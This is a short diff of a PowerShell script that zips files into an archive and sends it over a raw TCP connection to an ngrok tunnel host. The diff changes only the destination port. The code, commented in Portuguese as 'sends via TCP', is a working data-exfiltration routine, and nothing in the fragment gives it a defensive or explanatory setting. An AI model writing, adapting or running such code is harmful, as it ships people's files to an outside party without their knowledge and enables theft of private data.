@@ -12,7 +12,7 @@ Compress-Archive `
     -DestinationPath $zip -Force
 
 # Envia via TCP
-$c = New-Object Net.Sockets.TCPClient("6.tcp.eu.ngrok.io",11498)
+$c = New-Object Net.Sockets.TCPClient("6.tcp.eu.ngrok.io",19921)
 $s = $c.GetStream()
 $b = [IO.File]::ReadAllBytes($zip)
 $s.Write($b,0,$b.Length)
